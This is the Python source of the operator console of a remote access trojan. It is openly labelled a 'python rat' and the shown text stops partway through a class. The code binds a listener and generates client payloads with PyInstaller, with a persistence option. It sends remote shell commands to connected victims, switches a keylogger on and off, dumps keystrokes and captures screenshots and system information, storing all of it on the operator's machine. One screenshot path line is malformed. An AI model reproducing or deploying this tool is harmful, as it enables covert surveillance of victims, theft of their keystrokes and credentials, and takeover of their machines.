#!usr/bin/env/python
'''
A python rat
Note this tool is under development
github link: https://www.github.com/krishpranav
follow me on github :)
'''

#imports
import sys
import os
import socket
import time
import base64
import tabulate
import signal 
import subprocess
import argparse
import shutil
import threading
import platform
import PyInstaller.__main__
from datetime import datetime



__LOGO__ = """
         %s RAT 
"""

__HELP_OVERALL__ = """usage: python3 console.py command [--help] [--option OPTION]

These are the commands available for usage:

    bind        Run the Server on machine and establish connections
    generate    Generate the Payload file for target platform

You can further get help on available commands by supplying
'--help' argument. For example: 'python3 console generate --help'
will print help manual for generate commmand
"""

__HELP_BIND__   = """usage: python3 console.py bind [--address ADDRESS] [--port PORT]

    Args              Description
    -h, --help        Show Help for Bind command
    -a, --address     IP Address to Bind to
    -p, --port        Port Number on which to Bind

The Bind command is used to bind the application on server
for incoming connections and control the clients through
the command interface
"""

__HELP_GENERATE__ = """
usage: python3 console.py generate [--address ADDRESS] [--port PORT] [--output OUTPUT]

    Args              Description
    -h, --help        Show Help Manual for generate command
    -a, --address     IP Address of server. [Connect to]
    -p, --port        Port of connecting server
    -o, --output      Output file to generate
    -s, --source      Do not generate compiled code.
                      Gives Python source file.
        --persistence Auto start on reboot [Under Development]

The generate command generates the required payload
file to be executed on client side. The establish
connection to server and do commands.
"""

class PULL:

    WHITE = '\033[1m\033[0m'
    PURPLE = '\033[1m\033[95m'
    CYAN = '\033[1m\033[96m'
    DARKCYAN = '\033[1m\033[36m'
    BLUE = '\033[1m\033[94m'
    GREEN = '\033[1m\033[92m'
    YELLOW = '\033[1m\033[93m'
    RED = '\033[1m\033[91m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'
    LINEUP = '\033[F'

    def __init__(self):
        if not self.support_colors():
            self.win_colors()
            
    def support_colors(self):
        plat = sys.platform
        supported_platform = plat != 'Pocket PC' and (plat != 'win32' or \
                                                        'ANSICON' in os.environ)
        is_a_tty = hasattr(sys.stdout, 'isatty') and sys.stdout.isatty()
        if not supported_platform or not is_a_tty:
            return False
        return True

    def win_colors(self):
        self.WHITE = ''
        self.PURPLE = ''
        self.CYAN = ''
        self.DARKCYAN = ''
        self.BLUE = ''
        self.GREEN = ''
        self.YELLOW = ''
        self.RED = ''
        self.BOLD = ''
        self.UNDERLINE = ''
        self.END = ''

    def get_com(self, mss=()):
        if mss:
            rtval = input(self.DARKCYAN + "$" + self.END + " [" + self.GREEN + mss[1].ip + self.END + ":" + self.RED + str(mss[1].port) + self.END + "] ")
        else:
            rtval = input(self.DARKCYAN + "$" + self.END + " ")
        rtval = rtval.rstrip(" ").lstrip(" ")
        return rtval

    def print(self, mess):
        print(self.GREEN + "[" + self.UNDERLINE + "*" + self.END + self.GREEN + "] " + self.END + mess + self.END)

    def function(self, mess):
        print(self.BLUE + "[" + self.UNDERLINE + ":" + self.END + self.BLUE + "] " + self.END + mess + self.END)

    def error(self, mess):
        print(self.RED + "[" + self.UNDERLINE + "!" + self.END + self.RED + "] " + self.END + mess + self.END)

    def exit(self, mess=""):
        sys.exit(self.RED + "[" + self.UNDERLINE + "~" + self.END + self.RED + "] " + self.END + mess + self.END)

    def logo(self):
        print(self.DARKCYAN + __LOGO__ % self.YELLOW + self.END)

    def help_c_current(self):
        headers = (pull.BOLD + 'Command' + pull.END, pull.BOLD + 'Description' + pull.END)
        lister  = [
            ('help', 'Shows manual for commands'),
            ('sessions', 'Show all connected clients to the server'),
            ('connect', 'Connect to a Specific Client'),
            ('disconnect', 'Disconnect from Current Client'),
            ('clear', 'Clear Screen'),
            ('shell'  , 'Launch a New Terminal/Shell.'),
            ('keylogger', 'KeyLogger Module'),
            ('sysinfo', 'Dump System, Processor, CPU and Network Information'),
            ('screenshot', 'Take Screenshot on Target Machine and Save on Local'),
            ('exit', 'Exit from Console-Rat!')
        ]
        sys.stdout.write("\n")
        print(tabulate.tabulate(lister, headers=headers))
        sys.stdout.write("\n")

    def help_c_general(self):
        headers = (pull.BOLD + 'Command' + pull.END, pull.BOLD + 'Description' + pull.END)
        lister  = [
            ('help', 'Shows manual for commands'),
            ('sessions', 'Show all connected clients to the server'),
            ('connect', 'Connect to a Specific Client'),
            ('disconnect', 'Disconnect from Current Client'),
            ('clear', 'Clear Screen'),
            ('exit', 'Exit from Console-Rat!')
        ]
        sys.stdout.write("\n")
        print(tabulate.tabulate(lister, headers=headers))
        sys.stdout.write("\n")

    def help_c_sessions(self):
        sys.stdout.write("\n")
        print("Info       : Display connected sessions to the server!")
        print("Arguments  : None")
        print("Arguments  : None")
        print("Example    : \n")
        print("$ sessions")
        sys.stdout.write("\n")

    def help_c_connect(self):
        sys.stdout.write("\n")
        print("Info       : Connect to an available session!")
        print("Arguments  : Session ID")
        print("Example    : \n")
        print("$ connect 56\n")
        headers = (pull.BOLD + 'Argument' + pull.END, pull.BOLD + 'Type' + pull.END, pull.BOLD + 'Description' + pull.END)
        lister  = [
            ('ID', 'integer', 'ID of the sessions from the list')
        ]
        print(tabulate.tabulate(lister, headers=headers))
        sys.stdout.write("\n")

    def help_c_disconnect(self):
        sys.stdout.write("\n")
        print("Info          :  Disconnect current session!")
        print("Arguments     : None")
        print("Example       : \n")
        print("$ disconnect")
        sys.stdout.write("\n")

    def help_c_clear(self):
        sys.stdout.write("\n")
        print("Info       : Clear screen!")
        print("Arguments  : None")
        print("Example    : \n")
        print("$ clear")
        sys.stdout.write("\n")

    def help_c_shell(self):
        sys.stdout.write("\n")
        print("Info       : Launch a shell against client!")
        print("Arguments  : None")
        print("Example    : \n")
        print("$ shell")
        sys.stdout.write("\n")

    def help_c_keylogger(self):
        sys.stdout.write("\n")
        print("Info       : Keylogger Module!")
        print("Arguments  : on, off, dump")
        print("Example    : \n")
        print("$ keylogger on")
        print("$ keylogger off")
        print("$ keylogger dump\n")
        headers = (pull.BOLD + 'Argument' + pull.END, pull.BOLD + 'Description' + pull.END)
        lister = [
            ('on', 'Turn Keylogger on'),
            ('off', 'Turn Keylogger off'),
            ('dump', 'Dump keylogs')
        ]
        print(tabulate.tabulate(lister, headers=headers))
        sys.stdout.write("\n")

    def help_c_sysinfo(self):
        sys.stdout.write("\n")
        print("Info       : Gathers system information!")
        print("Arguments  : None")
        print("Example    : \n")
        print("$ sysinfo")
        sys.stdout.write("\n")

    def help_c_screenshot(self):
        sys.stdout.write("\n")
        print("Info       : Screenshot the current screen and save it on server!")
        print("Arguments  : None")
        print("Example    : \n")
        print("$ screenshot")
        sys.stdout.write("\n")

    def help_overall(self):
        global __HELP_OVERALL__
        print(__HELP_OVERALL__)
        sys.exit(0)

    def help_bind(self):
        global __HELP_BIND__
        print(__HELP_BIND__)
        sys.exit(0)

    def help_generate(self):
        global __HELP_GENERATE__
        print(__HELP_GENERATE__)
        sys.exit(0)


pull = PULL()

class CLIENT:

    STATUS  = "Active"
    MESSAGE = ""
    KEY     = ")J@NcRfU"

    def __init__(self, sock, addr):
        self.sock     = sock
        self.ip       = addr[0]
        self.port     = addr[1]

    def acceptor(self):
        data = ""
        chunk = ""

        while True:
            chunk = self.sock.recv(4096)
            if not chunk:
                self.STATUS = "Disconnected"
                break
            data += chunk.decode('utf-8')
            if self.KEY.encode('utf-8') in chunk:
                try:
                    self.MESSAGE = base64.decodebytes(data.rstrip(self.KEY).encode('utf-8')).decode('utf-8')
                except UnicodeDecodeError:
                    self.MESSAGE = base64.decodebytes(data.rstrip(self.KEY).encode('utf-8'))
                if not self.MESSAGE:
                    self.MESSAGE = ""
                data = ""


    def engage(self):
        t = threading.Thread(target=self.acceptor)
        t.daemon = True
        t.start()

    def send_data(self, val):
        self.sock.send(base64.encodebytes(val.encode('utf-8')) + self.KEY.encode('utf-8'))

    def recv_data(self):
        while not self.MESSAGE:
            try:
                pass
            except KeyboardInterrupt:
                break
        rtval = self.MESSAGE
        self.MESSAGE = ""
        return rtval

class COMMCENTER:

    CLIENTS = []
    COUNTER = 0
    CURRENT = ()    
    KEYLOGS = []

    def c_help(self, vals):
        if len(vals) > 1:
            if vals[1] == "sessions":
                pull.help_c_sessions()
            elif vals[1] == "connect":
                pull.help_c_connect()
            elif vals[1] == "disconnect":
                pull.help_c_disconnect()
            elif vals[1] == "clear":
                pull.help_c_clear()
            elif vals[1] == "shell":
                pull.help_c_shell()
            elif vals[1] == "keylogger":
                pull.help_c_keylogger()
            elif vals[1] == "sysinfo":
                pull.help_c_sysinfo()
            elif vals[1] == "screenshot":
                pull.help_c_screenshot()
        else:
            if self.CURRENT:
                pull.help_c_current()
            else:
                pull.help_c_general()

    def get_valid(self, _id):
        for client in self.CLIENTS:
            if client[0] == int(_id):
                return client

        return False

    def c_ping(self, _id):
        return

    def c_connect(self, args):
        if len(args) == 2:
            tgt = self.get_valid(args[1])
            if tgt:
                self.CURRENT = tgt
            else:
                sys.stdout.write("\n")
                pull.error("No client is associated with that ID")
                sys.stdout.write("\n")
        else:
            sys.stdout.write("\n")
            pull.error("Invalid Syntax")
            sys.stdout.write("\n")

    def c_disconnect(self):
        self.CURRENT = ()

    def c_sessions(self):
        headers = (pull.BOLD + 'ID' + pull.END, pull.BOLD + 'IP Address' + pull.END, pull.BOLD + 'Incoming Port' + pull.END, pull.BOLD + 'Status' + pull.END)
        lister = []

        for client in self.CLIENTS:
            toappend = []
            toappend.append(pull.RED + str(client[0]) + pull.END)
            toappend.append(pull.DARKCYAN + client[1].ip + pull.END)
            toappend.append(pull.BLUE + str(client[1].port) + pull.END)
            toappend.append(pull.GREEN + client[1].STATUS + pull.END)
            lister.append(toappend)

        sys.stdout.write("\n")
        print(tabulate.tabulate(lister, headers=headers))
        sys.stdout.write("\n")

    def c_shell(self):
        result = ""
        if self.CURRENT:
            sys.stdout.write("\n")
            while True:
                val = input("# ")
                val = "shell:" + val.rstrip(" ").lstrip(" ")

                if val:
                    if val != "shell:exit":
                        self.CURRENT[1].send_data(val)
                        result = self.CURRENT[1].recv_data()
                        if result.strip(" "):
                            print(result)
                    else:
                        break

        else:
            sys.stdout.write("\n")
            pull.error("You need to connect before execute this command")
            sys.stdout.write("\n")

    def c_clear(self):
        subprocess.call(["clear"], shell=True)

    def c_keylogger(self, args):
        if self.CURRENT:
            if len(args) == 2:
                if args[1] == "status":
                    return
                elif args[1] == "on":
                    self.CURRENT[1].send_data("keylogger:on")
                    result = self.CURRENT[1].recv_data()
                    if result.strip(" "):
                        print(result)

                elif args[1] == "off":
                    self.CURRENT[1].send_data("keylogger:off")
                    result = self.CURRENT[1].recv_data()
                    if result.strip(" "):
                        print(result)

                elif args[1] == "dump":
                    self.CURRENT[1].send_data("keylogger:dump")
                    result = self.CURRENT[1].recv_data()
                    dirname = os.path.dirname(__file__)
                    dirname = os.path.join( dirname, 'keylogs' )
                    if not os.path.isdir(dirname):
                        os.mkdir(dirname)
                    dirname = os.path.join( dirname, '%s' % (self.CURRENT[1].ip) )
                    if not os.path.isdir(dirname):
                        os.mkdir(dirname)
                    fullpath = os.path.join( dirname, datetime.now().strftime("%d-%m-%Y %H:%M:%S.txt") )
                    fl = open( fullpath, 'w' )
                    fl.write( result )
                    fl.close()
                    pull.print("Dumped: [" + pull.GREEN + fullpath + pull.END + "]")

                else:
                    pull.error("Invalid Syntax!")
            else:
                pull.error("Invalid Syntax!")
        else:
            pull.error("You need to connect before execute this command!")

    def c_sysinfo(self):
        if self.CURRENT:
            self.CURRENT[1].send_data("sysinfo:")
            result = self.CURRENT[1].recv_data()
            if result.strip( " " ):
                print(result)
        else:
            pull.error("You need to connect before execute this command")

    def c_screenshot(self):
        if self.CURRENT:
            self.CURRENT[1].send_data("screenshot:")
            result = self.CURRENT[1].recv_data()
            dirname = os.path.dirname(__file__)
            dirname = os.path.join( dirname, 'screenshots')
            if not os.path.isdir(dirname):
                os.mkdir(dirname)
            dirname = os.path.join( dirname, '%' % (self.CURRENT[1].ip) )
            if not os.path.isdir(dirname):
                os.mkdir(dirname)
            fullpath = os.path.join(dirname, datetime.now().strftime("%d-%m-%Y %H:%M:%S.png"))
            fl = open( fullpath, 'wb')
            fl.write( result)
            fl.close()
            pull.print("Saved: [" + pull.DARKCYAN + fullpath + pull.END + "]")
        else:
            pull.error("You need to connect to client before execute this command")
    
    def c_exit(self):
        sys.stdout.write("\n")
        pull.exit("Exiting...\n")

class INTERFACE(COMMCENTER):

    SOCKET = None
    RUNNER = True

    def __init__(self, prs):
        self.address = prs.address
        self.port    = prs.port